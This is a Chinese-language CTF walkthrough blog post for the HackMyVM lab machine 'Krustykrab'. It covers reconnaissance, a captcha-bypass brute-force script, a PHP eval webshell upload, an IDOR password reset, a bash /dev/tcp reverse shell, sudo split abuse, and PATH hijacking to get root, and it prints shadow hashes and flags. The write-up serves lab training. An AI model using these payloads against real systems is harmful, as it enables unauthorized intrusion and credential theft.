{"pageProps":{"postData":{"id":"HackMyVMKrustykrab","contentHtml":"<h1>Krustykrab.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Krustykrab\">https://hackmyvm.eu/machines/machine.php?vm=Krustykrab</a></p>\n</blockquote>\n<p>Note：<strong>who lives in a pineapple under the sea?</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Krustykrab nmap -sP 192.168.56.0/24                        \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-17 08:23 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00038s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00021s latency).\nMAC Address: 08:00:27:47:36:38 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.132\nHost is up (0.00033s latency).\nMAC Address: 08:00:27:DE:9C:4B (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Krustykrab nmap -sT -min-rate 10000 -p- 192.168.56.132         \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-17 08:24 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.132\nHost is up (0.0011s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:DE:9C:4B (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 12.62 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Krustykrab nmap -sT -A -T4 -O -p 22,80 192.168.56.132 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-17 08:24 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.132\nHost is up (0.00044s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)\n| ssh-hostkey: \n|   256 f6:91:6b:ad:ea:ad:1d:b9:44:09:d8:74:a3:02:38:35 (ECDSA)\n|_  256 b6:66:2f:f0:4c:26:7f:7d:14:ea:b3:62:09:64:a7:94 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Apache2 Ubuntu Default Page: It works\nMAC Address: 08:00:27:DE:9C:4B (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.44 ms 192.168.56.132\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 15.61 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Krustykrab nmap -script=vuln 22,80 192.168.56.132 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-17 21:42 EDT\nFailed to resolve <span class=\"hljs-string\">\"22,80\"</span>.\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.132\nHost is up (0.00020s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n|_http-csrf: Couldn'</span>t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\nMAC Address: 08:00:27:DE:9C:4B (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 38.03 seconds\n</span></code></pre>\n<h2>Web 渗透</h2>\n<h3>信息收集</h3>\n<p>访问 <code>HTTP</code> 服务，<code>Apache</code> 默认页</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image.png\" alt=\"image.png\"></p>\n<p>没什么信息，目录爆破一波，也没什么信息</p>\n<pre><code class=\"hljs language-bash\">➜  Krustykrab gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.56.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.132\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   403,404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              zip,php,txt,html\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 11539]\nProgress: 1102800 / 1102805 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>检查一下源码，能找到 <code>/var/www/html/finexo</code></p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image1.png\" alt=\"image.png\"></p>\n<p>访问该目录</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image2.png\" alt=\"image.png\"></p>\n<p><code>Team</code> 里面可以找到几个用户名，全是<strong>海绵宝宝</strong>里面的角色</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image3.png\" alt=\"image.png\"></p>\n<p>扫描以下目录</p>\n<pre><code class=\"hljs language-bash\">➜  Krustykrab gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.56.132/finexo -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip -b 403,404\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.132/finexo\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   403,404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 324] [--> http://192.168.56.132/finexo/images/]\n/index.html           (Status: 200) [Size: 27452]\n/about.html           (Status: 200) [Size: 8932]\n/login.php            (Status: 200) [Size: 4287]\n/uploads              (Status: 301) [Size: 325] [--> http://192.168.56.132/finexo/uploads/]\n/assets               (Status: 301) [Size: 324] [--> http://192.168.56.132/finexo/assets/]\n/service.html         (Status: 200) [Size: 9992]\n/css                  (Status: 301) [Size: 321] [--> http://192.168.56.132/finexo/css/]\n/team.html            (Status: 200) [Size: 12244]\n/test.php             (Status: 500) [Size: 0]\n/js                   (Status: 301) [Size: 320] [--> http://192.168.56.132/finexo/js/]\n/why.html             (Status: 200) [Size: 10553]\n/logout.php           (Status: 302) [Size: 0] [--> login.php]\n/config.php           (Status: 200) [Size: 0]\n/fonts                (Status: 301) [Size: 323] [--> http://192.168.56.132/finexo/fonts/]\n/dashboard            (Status: 301) [Size: 327] [--> http://192.168.56.132/finexo/dashboard/]\nProgress: 1102800 / 1102805 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>在 <code>/finexo/assets/json/</code> 能找到 <code>2500.txt</code> 文件，里面像是用户信息之类的东西</p>\n<pre><code class=\"hljs language-less\">{\n  \"<span class=\"hljs-selector-tag\">aaData</span>\": <span class=\"hljs-selector-attr\">[\n    [\n      <span class=\"hljs-string\">\"1\"</span>,\n      <span class=\"hljs-string\">\"Armand\"</span>,\n      <span class=\"hljs-string\">\"Warren\"</span>,\n      <span class=\"hljs-string\">\"56045\"</span>,\n      <span class=\"hljs-string\">\"Taiwan, Province of China\"</span>\n    ]</span>,\n    <span class=\"hljs-selector-attr\">[\n      <span class=\"hljs-string\">\"2\"</span>,\n      <span class=\"hljs-string\">\"Xenos\"</span>,\n      <span class=\"hljs-string\">\"Salas\"</span>,\n      <span class=\"hljs-string\">\"71090\"</span>,\n      <span class=\"hljs-string\">\"Liberia\"</span>\n    ]</span>,\n........\n</code></pre>\n<p>登录页面在 <code>/finexo/login.php</code></p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image4.png\" alt=\"image.png\"></p>\n<h3>登录逻辑</h3>\n<p>测试之后，发现是存在用户**<code>SpongeBob</code>**的，不存在的其他用户都是 <code>User doesn't exit</code></p>\n<p>本来想绕过验证码进行登录，但是发现验证码绕不过，会提示：<code>Wrong Captcha</code></p>\n<pre><code class=\"hljs language-bash\">POST /finexo/login.php HTTP/1.1\nHost: 192.168.56.132\n......\nusername=SpongeBob&#x26;password=1&#x26;captcha=wcfh\n</code></pre>\n<p>观察验证码逻辑，登陆会加载</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image5.png\" alt=\"image.png\"></p>\n<p>其中<code>/finexo/login.php?action=generateCaptcha</code> 是用来生成验证码的</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image6.png\" alt=\"image.png\"></p>\n<p><code>/finexo/particles.js-master/dist/particles.min.js</code> 中发现加密后的 <code>js</code></p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image7.png\" alt=\"image.png\"></p>\n<p>一眼 <code>JsFuck</code> ，通过 <a href=\"https://www.dcode.fr/jsfuck-language\">https://www.dcode.fr/jsfuck-language</a> 可以进行解密，解密后的内容如下</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">generateCaptcha</span></span>() { \n\t<span class=\"hljs-variable\">$characters</span> = <span class=\"hljs-string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"</span>; \n\t<span class=\"hljs-variable\">$code</span> = <span class=\"hljs-string\">\"\"</span>; \n\t<span class=\"hljs-variable\">$seed</span> = <span class=\"hljs-keyword\">time</span>(); \n\tmt_srand(<span class=\"hljs-variable\">$seed</span>); \n\t<span class=\"hljs-keyword\">for</span> (<span class=\"hljs-variable\">$i</span> = 0; <span class=\"hljs-variable\">$i</span> &#x3C; 4; <span class=\"hljs-variable\">$i</span>++) { \n\t\t<span class=\"hljs-variable\">$code</span> .= <span class=\"hljs-variable\">$characters</span>[mt_rand(0, strlen(<span class=\"hljs-variable\">$characters</span>) - 1)]; \n\t} \n\t<span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">'captcha'</span>] = strtolower(<span class=\"hljs-variable\">$code</span>); <span class=\"hljs-built_in\">return</span> <span class=\"hljs-variable\">$code</span>; \n}\n</code></pre>\n<blockquote>\n<p>这个函数的核心流程：</p>\n<ol>\n<li>从指定字符集合里随机选取4个字符组成验证码；</li>\n<li>把验证码的小写版本存入 <code>$_SESSION</code>，用于后续验证；</li>\n<li>返回验证码原文，通常前端页面会用这个值生成图片或者直接显示。</li>\n</ol>\n</blockquote>\n<p>这里<code>generateCaptcha</code>中的<code>session</code>如果和<code>Login</code>中的<code>session</code>如果是同一个，那么就可以绕过验证码了</p>\n<p>编写脚本验证</p>\n<pre><code class=\"hljs language-bash\">import requests\n\nlogin_url = <span class=\"hljs-string\">'http://192.168.56.132/finexo/login.php'</span>\ncode_url = <span class=\"hljs-string\">'http://192.168.56.132/finexo/login.php?action=generateCaptcha'</span>\n\ns = requests.session()\ncode = s.get(code_url).text\ndata = {\n    <span class=\"hljs-string\">'username'</span>: <span class=\"hljs-string\">'SpongeBob'</span>,\n    <span class=\"hljs-string\">'password'</span>: <span class=\"hljs-string\">'test'</span>,\n    <span class=\"hljs-string\">'captcha'</span>: code,\n}\nres = s.post(login_url, data)\n<span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">'Wrong Password'</span> <span class=\"hljs-keyword\">in</span> res.text:\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">'Wrong password'</span>)\n<span class=\"hljs-keyword\">else</span>:\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">'验证码错误'</span>)\n</code></pre>\n<p>返回 <code>Wrong Password</code>，验证码有效</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image8.png\" alt=\"image.png\"></p>\n<h3>登录爆破</h3>\n<p>编写脚本进行爆破</p>\n<pre><code class=\"hljs language-bash\">import requests\n\nlogin_url = <span class=\"hljs-string\">'http://192.168.56.132/finexo/login.php'</span>\ncode_url = <span class=\"hljs-string\">'http://192.168.56.132/finexo/login.php?action=generateCaptcha'</span>\n\ns = requests.session()\n\nwith open(<span class=\"hljs-string\">'rockyou.txt'</span>, <span class=\"hljs-string\">'r'</span>) as f:\n    <span class=\"hljs-keyword\">for</span> line <span class=\"hljs-keyword\">in</span> f:\n        line = line.strip()\n        code = s.get(code_url).text\n        data = {\n            <span class=\"hljs-string\">'username'</span>: <span class=\"hljs-string\">'SpongeBob'</span>,\n            <span class=\"hljs-string\">'password'</span>: line,\n            <span class=\"hljs-string\">'captcha'</span>: code,\n        }\n        res = s.post(login_url, data)\n        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">'Wrong Password'</span> <span class=\"hljs-keyword\">in</span> res.text:\n            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">'Wrong password:{line}'</span>)\n        <span class=\"hljs-keyword\">elif</span> <span class=\"hljs-string\">'Wrong Captcha'</span> <span class=\"hljs-keyword\">in</span> res.text:\n            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">'Wrong captcha'</span>)\n        <span class=\"hljs-keyword\">else</span>:\n            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">'密码正确：{line}'</span>)\n            <span class=\"hljs-built_in\">break</span>\n</code></pre>\n<p>正确密码是：<code>squarepants</code> ，感觉这个还可以根据用户名来猜密码…因为海绵宝宝全称就是<code>*SpongeBob SquarePants*</code></p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image9.png\" alt=\"image.png\"></p>\n<h3>文件上传（兔子洞）</h3>\n<p>登陆进去</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image10.png\" alt=\"image.png\"></p>\n<p>有一个文件上传页面，能上传头像</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image11.png\" alt=\"image.png\"></p>\n<p>构造恶意数据包</p>\n<pre><code class=\"hljs language-bash\">------geckoformboundary4059528d1f58fd4c6ea77567d1b81073\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"profile_picture\"</span>; filename=<span class=\"hljs-string\">\"shell.php\"</span>\nContent-Type: image/png\n\nPNG\n\t&#x3C;?php <span class=\"hljs-built_in\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[1]); ?>\n</code></pre>\n<p>没有任何限制，直接上传成功了</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image12.png\" alt=\"image.png\"></p>\n<p>但是发现会经过二次处理，上传之后的马都经过二次处理后变得无法使用</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image13.png\" alt=\"image.png\"></p>\n<h3>越权</h3>\n<p>我们还可以注意到有 <code>New Password</code> 输入框</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image11.png\" alt=\"image.png\"></p>\n<p>数据包里面长这样</p>\n<pre><code class=\"hljs language-bash\">------geckoformboundary4059528d1f58fd4c6ea77567d1b81073\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"password\"</span>\n\n123456\n------geckoformboundary4059528d1f58fd4c6ea77567d1b81073\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"username\"</span>\n\nSpongeBob\n------geckoformboundary4059528d1f58fd4c6ea77567d1b81073--\n</code></pre>\n<p>并且在 mail 中可以发现用户 <code>Administratro</code></p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image14.png\" alt=\"image.png\"></p>\n<p>尝试将<code>SpongeBob</code>改为<code>administrator</code> ，提示成功</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image15.png\" alt=\"image.png\"></p>\n<p>尝试以 <code>Administratro</code> 用户进行登录，成功登录</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image16.png\" alt=\"image.png\"></p>\n<p>可以在下面找到命令执行的功能</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/image17.png\" alt=\"image.png\"></p>\n<p>进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">/bin/bash -c <span class=\"hljs-string\">'bash -i >&#x26; /dev/tcp/192.168.56.4/1234 0>&#x26;1'</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Krustykrab nc -lvp 1234                               \nlistening on [any] 1234 ...\n192.168.56.132: inverse host lookup failed: Unknown host\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.132] 46124\nbash: cannot <span class=\"hljs-built_in\">set</span> terminal process group (691): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control <span class=\"hljs-keyword\">in</span> this shell\nwww-data@KrustyKrab:/var/www/html/finexo/admin_dashborad$ \n</code></pre>\n<h2>提权</h2>\n<h3>to KrustyKrab</h3>\n<p>查看权限</p>\n<pre><code class=\"hljs language-bash\">www-data@KrustyKrab:/var/www/html/finexo/admin_dashborad$ <span class=\"hljs-built_in\">sudo</span> -l\n<span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> www-data on KrustyKrab:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser www-data may run the following commands on KrustyKrab:\n    (KrustyKrab) NOPASSWD: /usr/bin/split\n</code></pre>\n<p>通过 <code>GTFbins</code> 寻找利用方法</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">sudo</span> -u KrustyKrab <span class=\"hljs-built_in\">split</span> --filter=/bin/sh -\n</code></pre>\n<p>可以获得 <code>KrustyKrab</code> 的 <code>shell</code>，写入公钥</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"ssh-rsa xxxxx\"</span> > .ssh/authorized_keys\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Krustykrab ssh KrustyKrab@192.168.56.132\nLinux KrustyKrab 6.1.0-9-amd64 <span class=\"hljs-comment\">#1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64</span>\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms <span class=\"hljs-keyword\">for</span> each program are described <span class=\"hljs-keyword\">in</span> the\nindividual files <span class=\"hljs-keyword\">in</span> /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sun Mar 30 00:15:24 2025 from 192.168.56.118\nKrustyKrab@KrustyKrab:~$ \n</code></pre>\n<h3>to spongebob</h3>\n<p>家目录下可以读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-ruby\"><span class=\"hljs-title class_\">KrustyKrab</span><span class=\"hljs-variable\">@KrustyKrab</span><span class=\"hljs-symbol\">:~</span><span class=\"hljs-variable\">$ </span>cat user.txt\ndcc8b0c111c9fa1522c7abfac8d1864b\n</code></pre>\n<p>查看 sudo 权限</p>\n<pre><code class=\"hljs language-bash\">KrustyKrab@KrustyKrab:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> KrustyKrab on KrustyKrab:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser KrustyKrab may run the following commands on KrustyKrab:\n    (spongebob) NOPASSWD: /usr/bin/ttteeesssttt\n</code></pre>\n<p>海绵宝宝忘记怎么做蟹黄包了，你快帮帮他</p>\n<pre><code class=\"hljs language-bash\">KrustyKrab@KrustyKrab:~$ <span class=\"hljs-built_in\">sudo</span> -u spongebob /usr/bin/ttteeesssttt\n\nSpongebob forgot how to make Krabby Patty, You need to <span class=\"hljs-built_in\">help</span> him!\n\nCurrent shuffled recipe order:\nA: Mustard\nB: Onion\nC: Ketchup\nD: Lettuce\nE: Cheese\nF: Pickles\nG: Top bun\nH: Patty\nI: Tomato\nJ: Bottom bun\n\nPlease enter the correct order using letters (e.g., ABCDEFGHIJ):\nEnter 10 letters (A-J): \n</code></pre>\n<p>当前目录下还有一个文件 <code>help</code> ，是一个 <code>GIF</code> 文件</p>\n<pre><code class=\"hljs language-bash\">KrustyKrab@KrustyKrab:~$ file <span class=\"hljs-built_in\">help</span>\n<span class=\"hljs-built_in\">help</span>: GIF image data, version 89a, 480 x 270\n</code></pre>\n<p><img src=\"/post-images/HackMyVMKrustykrab/help.gif\" alt=\"help.gif\"></p>\n<p>刚好是蟹黄包配方：面包、肉饼、生菜、奶酪、洋葱、西红柿、番茄酱、芥末、腌椰菜、面包</p>\n<pre><code class=\"hljs language-bash\">......\nEnter 10 letters (A-J): JHDEBICAFG\n\nValidation successful! Perfect Krabby Patty!\nspongebob@KrustyKrab:/home/KrustyKrab$ \n</code></pre>\n<p>顺序正确后得到了<code>spongebob</code>的<code>shell</code></p>\n<p>写入公钥</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"ssh-rsa xxxxx\"</span> > .ssh/authorized_keys\n</code></pre>\n<h3>to Krustykrab</h3>\n<p><code>spongebob</code> 的家目录下存在</p>\n<pre><code class=\"hljs language-bash\">spongebob@KrustyKrab:~$ <span class=\"hljs-built_in\">ls</span>\nkey1  key2.jpeg  note.txt\n</code></pre>\n<ul>\n<li>\n<p>key1</p>\n<pre><code class=\"hljs language-bash\">spongebob@KrustyKrab:~$ <span class=\"hljs-built_in\">cat</span> key1\ne1964798cfe86e914af895f8d0291812\n</code></pre>\n</li>\n<li>\n<p>note.txt</p>\n<pre><code class=\"hljs language-bash\">spongebob@KrustyKrab:~$ <span class=\"hljs-built_in\">cat</span> note.txt \n\nSquidward is waiting <span class=\"hljs-keyword\">for</span> you!!!!\n\npassword is md5($key1<span class=\"hljs-variable\">$key2</span>).\n\nIt<span class=\"hljs-string\">'s not so hard as you think.\n</span></code></pre>\n</li>\n<li>\n<p>key2.jpeg</p>\n<p><img src=\"/post-images/HackMyVMKrustykrab/key2.jpeg\" alt=\"key2.jpeg\"></p>\n</li>\n</ul>\n<p>看着像是图片隐写，但是没分离出来什么东西</p>\n<p>尝试将 <code>key1</code> 加上该图片的 MD5 值进行计算</p>\n<pre><code class=\"hljs language-bash\">➜  Krustykrab <span class=\"hljs-built_in\">cat</span> key2.jpeg | <span class=\"hljs-built_in\">md5sum</span>\n5e1d0c1a168dc2d70004c2b00ba314ae  -\n➜  Krustykrab <span class=\"hljs-built_in\">echo</span> -n <span class=\"hljs-string\">\"e1964798cfe86e914af895f8d02918125e1d0c1a168dc2d70004c2b00ba314ae\"</span> | <span class=\"hljs-built_in\">md5sum</span>\n7ac254848d6e4556b73398dde2e4ef82  -\n</code></pre>\n<p>竟然登陆成功了</p>\n<pre><code class=\"hljs language-bash\">➜  Krustykrab ssh Squidward@192.168.56.132                                                    \nSquidward@192.168.56.132<span class=\"hljs-string\">'s password: \nLinux KrustyKrab 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sun Mar 30 00:12:09 2025 from 192.168.56.118\n$ \n</span></code></pre>\n<h3>to root</h3>\n<p>当前目录下存在 <code>laststep</code></p>\n<p>执行，给 <code>shadow</code> 文件读出来了</p>\n<pre><code class=\"hljs language-bash\">./laststep\nroot:$y$j9T$xm9zjJdLydmP9yMp9Nj3C0<span class=\"hljs-variable\">$RK1zpq</span>.FysZjb30c5IUWzUi.BWYvIUsygxhgsyvyzO3:20174:0:99999:7:::\ndaemon:*:19549:0:99999:7:::\nbin:*:19549:0:99999:7:::\nsys:*:19549:0:99999:7:::\n<span class=\"hljs-built_in\">sync</span>:*:19549:0:99999:7:::\ngames:*:19549:0:99999:7:::\nman:*:19549:0:99999:7:::\nlp:*:19549:0:99999:7:::\nmail:*:19549:0:99999:7:::\nnews:*:19549:0:99999:7:::\nuucp:*:19549:0:99999:7:::\nproxy:*:19549:0:99999:7:::\nwww-data:*:19549:0:99999:7:::\nbackup:*:19549:0:99999:7:::\nlist:*:19549:0:99999:7:::\nirc:*:19549:0:99999:7:::\n_apt:*:19549:0:99999:7:::\nnobody:*:19549:0:99999:7:::\nsystemd-network:!*:19549::::::\nsystemd-timesync:!*:19549::::::\nmessagebus:!:19549::::::\navahi-autoipd:!:19549::::::\nsshd:!:19549::::::\nmysql:!:20171::::::\nKrustyKrab:$y$j9T$v3iavPLpYl5ezsR4pMSjc0<span class=\"hljs-variable\">$bPxk2s3wxGrhgv4PpFbYVP9sy4ERDnAzf14Ud</span>.p1Iq4:20174:0:99999:7:::\nspongebob:$y$j9T$QMeIdDraDWE0L5C65y6SN1<span class=\"hljs-variable\">$JqifleH2vWxsHdW</span>.1eZHTLEhqluSDP7RKOPhKdpGip8:20174:0:99999:7:::\nSquidward:$y$j9T$G4aYhd9T1rT4dzeu06RZZ1<span class=\"hljs-variable\">$mbjej1b0wgbrF</span>.KlZrP6WafH5tI9ssL8ztqEDDC2tD7:20174:0:99999:7:::\n</code></pre>\n<p>拿出来分析一下，很简单</p>\n<pre><code class=\"hljs language-bash\">int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  setgid(0);\n  setuid(0);\n  system(<span class=\"hljs-string\">\"cat /etc/shadow\"</span>);\n  <span class=\"hljs-built_in\">return</span> 0;\n}\n</code></pre>\n<p><code>cat</code> 没有使用绝对路径，可以尝试路径劫持</p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">env</span>\nUSER=Squidward\nSSH_CLIENT=192.168.56.4 47710 22\nXDG_SESSION_TYPE=<span class=\"hljs-built_in\">tty</span>\nHOME=/home/Squidward\nMOTD_SHOWN=pam\nSSH_TTY=/dev/pts/2\nDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1002/bus\nLOGNAME=Squidward\nXDG_SESSION_CLASS=user\nTERM=tmux-256color\nXDG_SESSION_ID=25\nPATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\nXDG_RUNTIME_DIR=/run/user/1002\nLANG=en_US.UTF-8\nSHELL=/bin/sh\nPWD=/home/Squidward\nSSH_CONNECTION=192.168.56.4 47710 192.168.56.132 22\n$ <span class=\"hljs-built_in\">export</span> PATH=.:<span class=\"hljs-variable\">$PATH</span>\n</code></pre>\n<p>创建恶意 <code>cat</code> 文件 <code>cat.c</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\">#include &#x3C;stdlib.h></span>\n\nint <span class=\"hljs-function\"><span class=\"hljs-title\">main</span></span>() {\n    system(<span class=\"hljs-string\">\"/bin/bash\"</span>);\n    <span class=\"hljs-built_in\">return</span> 0;\n}\n</code></pre>\n<pre><code class=\"hljs language-bash\">$ gcc cat.c -o <span class=\"hljs-built_in\">cat</span>\n$ ./laststep\nroot@KrustyKrab:~# \n</code></pre>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@KrustyKrab:/root# <span class=\"hljs-built_in\">cat</span> root.txt \nefe397e3897f0c19ef0150c2b69046a3\n</code></pre>","title":"HackMyVM - Krustykrab","date":"2025-04-18","updated":"2025-04-18","comments":true,"tags":["Linux靶机","HackMyVM","CTF","越权","路径劫持"],"categories":"靶机","description":"Krustykrab.\n\n https://hackmyvm.eu/machines/machine.php?vm=Krustykrab\n \n\nNote：who lives in a pineapple under the sea?\n\n前期踩点\n\n\n\n\n\n\n\n\n\nWeb 渗透\n\n信息收集\n\n访问 `HTTP` 服务，`Apache` 默认页\n\n\n\n没什么信息，目录爆破一波，也没什么信息\n\n\n\n检查..."},"recentPosts":[{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"HackTheBoxMachine - Scepter","title":"HackTheBox - Machine - Scepter","date":"2025-04-26","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"}]},"__N_SSG":true}